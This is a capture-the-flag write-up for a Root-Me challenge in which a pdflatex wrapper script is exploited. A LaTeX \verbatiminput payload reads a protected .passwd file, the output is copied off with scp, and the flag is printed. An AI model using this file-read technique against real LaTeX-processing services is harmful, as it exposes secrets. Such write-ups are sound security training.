---
layout: default
title: LaTeX-Input
---
We're being given this source code:

```bash
#!/usr/bin/env bash

if [[ $# -ne 1 ]]; then
    echo "Usage : ${0} TEX_FILE"
fi

if [[ -f "${1}" ]]; then
    TMP=$(mktemp -d)
    cp "${1}" "${TMP}/main.tex"

    # Compilation
    echo "[+] Compilation ..."
    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    timeout 5 /usr/bin/pdflatex \
        -halt-on-error \
        -output-format=pdf \
        -output-directory "${TMP}" \
        -no-shell-escape \
        "${TMP}/main.tex" > /dev/null

    chmod u+w "${TMP}/main.tex"
    rm "${TMP}/main.tex"
    chmod 750 -R "${TMP}"
    if [[ -f "${TMP}/main.pdf" ]]; then
        echo "[+] Output file : ${TMP}/main.pdf"
    else
        echo "[!] Compilation error, your logs : ${TMP}/main.log"
    fi
else
    echo "[!] Can't access file ${1}"
fi
```

It's using the flag `--no-shell-esacpe`. However, we still can achieve arbitrary file read, using the code from [https://gtfobins.org/gtfobins/pdflatex/#file-read](https://gtfobins.org/gtfobins/pdflatex/#file-read)

```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/path/to/file}
\end{document}
```
Our path to file will be the current dir + `.passwd`:

```bash
app-script-ch23@challenge02:~$ pwd
/challenge/app-script/ch23
```

So, full path will be `/challenge/app-script/ch23/.passwd` and full payload:
```tex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

Now, create temp folder, put the payload inside file and execute the exploit.
Don't forget to add `+x` to your folder, because you want to able the script to access your temp folder, to read `test.tex`.

![Pasted image 20260310093605.png](./images/images/Pasted image 20260310093605.png)

The result pdf is at `/tmp/tmp.Gi5Mi3l6AH/main.pdf`, however, we can't open it on the remote machine, since it doesn't have GUI.

We'll use `scp` to copy the file to our local machine:
```bash
scp -P 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.Gi5Mi3l6AH/main.pdf .
```

![Pasted image 20260310094808.png](./images/images/Pasted image 20260310094808.png)

Then, open it using `xdg-open main.pdf`.

![Pasted image 20260310094722.png](./images/images/Pasted image 20260310094722.png)

So, the flag is **LaTeX_1nput_1s_n0t_v3ry_s3kur3**.